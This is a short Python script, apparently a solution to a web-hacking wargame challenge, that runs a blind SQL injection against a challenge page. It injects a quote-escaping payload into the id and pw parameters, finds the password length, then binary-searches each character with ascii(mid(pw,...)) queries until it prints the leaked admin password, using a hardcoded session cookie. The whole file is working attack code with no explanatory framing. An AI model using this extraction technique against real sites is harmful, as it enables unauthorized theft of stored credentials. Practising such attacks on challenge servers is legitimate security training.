#!/usr/bin/env python3
# coding: utf-8

import requests
from math import floor

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}


def is_true(query):
    url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?id=\&pw=||id='admin'%26%26{0}%23".format(query)
    r = requests.get(url, headers=headers)
    if r.text.find('<h2>Hello admin</h2>') > -1:
        return True
    return False


def get_password_length():
    i = 1
    while True:
        query = "length(pw)={0}".format(i)
        if is_true(query):
            return i
        i += 1


def guess_char(location):
    bottom = 0
    top = 0xff
    while True:
        mid = floor((bottom + top) / 2)
        print('top :', top, ' | mid :', mid, ' | bottom :', bottom)
        query = "ascii(mid(pw,{0},1))>{1}".format(location, mid)
        if is_true(query):
            if top == bottom:
                return chr(mid)
            bottom = mid + 1
        else:
            if mid == top:
                return chr(mid)
            top = mid


def get_password():
    password = ''
    length = get_password_length()
    print('[*] password length :', length)
    for i in range(1, length + 1):
        password += guess_char(i)
        print('[*] leaked password :', password)
    return password


def main():
    password = get_password()
    print("[*] password :", password)


if __name__ == '__main__':
    main()

